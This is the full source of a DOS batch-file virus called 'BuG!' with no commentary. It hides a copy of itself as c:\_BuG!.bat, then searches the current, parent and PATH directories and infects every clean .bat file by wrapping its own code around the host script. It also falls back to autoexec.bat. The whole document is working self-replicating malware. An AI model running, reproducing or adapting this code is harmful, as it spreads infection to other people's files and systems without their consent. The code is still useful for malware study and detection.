@if '%_gobbm%==' goto _gobbm
::**** HOST ****

@if not '%_gobbm%==' goto BuG!end
:_gobbm BuG!
::BuG! ahoj
@echo off%_BuG!%
if '%1=='BuG! goto BuG!%2
set BuG!=%0.bat
if not exist %BuG!% set BuG!=%0
if '%BuG!%==' set BuG!=autoexec.bat
set !BuG!=%1 %2 %3 %4 %5 %6 %7 %8 %9
call %BuG!% BuG! rh
set _gobbm=>nul.BuG!
set !BuG!=
if exist c:\_BuG!.bat goto BuG!g
if exist %BuG!% goto BuG!fe
call %BuG!% BuG! h %path%
if exist %BuG!% goto BuG!fe
goto eBuG!
:BuG!h
shift%_BuG!%
if '%2==' goto BuG!end
if exist %2\%BuG! set BuG!=%2\%BuG!%
if exist %2%BuG! set BuG!=%2%BuG!%
if exist %2\%BuG!.bat set BuG!=%2\%BuG!%.bat
if exist %2%BuG!.bat set BuG!=%2%BuG!%.bat
if not exist %BuG!% goto BuG!h
goto BuG!end
:BuG!fe
find "BuG!"<%BuG!%>c:\_BuG!.bat
attrib c:\_BuG!.bat +h
:BuG!g
command /e:5000 /c c:\_BuG! BuG! vir . .. %path%
:eBuG!
set BuG!=
goto BuG!end
:BuG!rh
set _gobbm=x%_BuG!%
%BuG!% %!BuG!%
:BuG!vir
shift%_BuG!%
if '%2==' exit %BuG!%
for %%a in (%2\*.bat %2*.bat) do call c:\_BuG! BuG! i %%a
goto BuG!vir
:BuG!i
find "BuG!"<%3>nul
if not errorlevel 1 goto BuG!j
echo @if '%%_gobbm%%==' goto _gobbm>BuG!$
type %3>>BuG!$
echo.>>BuG!$
type c:\_BuG!.bat>>BuG!$
move BuG!$ %3>nul
exit BuG!
:BuG!j
set BuG!!=%BuG!#%1
if %BuG!!%==11111111111111111111 exit
:BuG!end

